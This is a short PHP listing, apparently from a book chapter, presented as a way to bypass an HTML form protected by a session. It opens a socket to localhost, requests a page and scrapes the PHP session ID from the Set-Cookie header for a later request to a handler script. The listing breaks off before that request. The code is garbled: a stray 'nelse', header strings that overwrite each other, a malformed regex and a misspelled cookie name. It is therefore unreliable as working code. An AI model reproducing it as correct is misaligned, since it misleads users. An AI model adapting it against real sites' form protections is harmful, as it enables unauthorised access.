# Listing II.5.13. Bypassing an HTML form protected by a session

```
<?php
$hostname = "localhost";
$path = "/test/index.php";

// Establishing the connection
// whose name is passed in the $hostname parameter
$fp = fsockopen($hostname, 80, $errno, $errstr, 30);
// Checking whether the connection has been successfully established
if (!$errno) echo "$errstr ($errno)<br />\n";nelse
{
    // Forming HTTP headers to be passed
    // to the server
    $headers = "GET $path HTTP/1.1\r\n";
    $headers = "Host: $hostname\r\n";
    $headers = "Connection: Close\r\n\n";
    // Sending an HTTP query to the server
    fwrite($fp, $headers);
    // Receiving the response
    while (!feof($fp))
    {
        $line = fgets($fp, 1024);
        // Searching for the string
        // like Set-Cookie: PHPESSID = 6197e647566bdaa24da3ab42ae7604b2;
        // This string sets the cookie
        preg_match("Set-Cookie: PHPESSID = ([\d\w]+)"/i", $line, $out);
        if (!empty($out[1]))
        {
            $SID = $out[1];
            break;
        }
    }
    fclose($fp);
}

$hostname = "localhost";
$path = "/test/handler.php";
$line = "";
```